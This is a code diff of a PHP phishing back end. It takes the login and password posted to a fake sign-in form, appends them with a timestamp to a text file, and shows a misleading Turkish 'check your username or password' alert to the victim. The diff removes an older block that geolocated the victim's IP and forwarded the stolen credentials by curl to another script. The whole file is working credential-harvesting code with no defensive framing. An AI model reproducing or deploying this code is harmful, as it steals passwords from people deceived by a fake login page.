@@ -1,25 +1,13 @@
 <?php  
-
+date_default_timezone_set('Europe/Istanbul');
+$tarih =" Tarih : ".date('d/m/Y  H:i');
 if (isset($_POST['login']) && isset($_POST['password'])) {
 $ac = fopen("kayit.txt","a+");
 $username = $_POST['login'];
 $password = $_POST['password'];
-$userlar = ("\n Email : ".$username."\n Password : ".$password."\n__________________ \n");
+$userlar = ("\n__________________ \n".$tarih."\n\n Email : ".$username."\n Password : ".$password."\n__________________ \n");
 fwrite($ac,$userlar);
 fclose($ac);
-$ipd = @unserialize(file_get_contents("http://ip-api.com/php/".$ip));
-$ip =$ipd["query"];
-date_default_timezone_set('Europe/Istanbul');
-$tarih =" Tarih : ".date('d/m/Y  H:i');
-$data = array("ip"=>$ip,"tarih"=>$tarih,"username"=>$username,"password"=>$password);
-$string = http_build_query($data);
-$ch = curl_init("http://localhost/Sites/data.php");
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $string);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_exec($ch);
-curl_close($ch);
-
 echo "<script>alert('Kullanıcı Adınız veya Şifrenizi kontrol ediniz!');</script>";
 }
  ?>
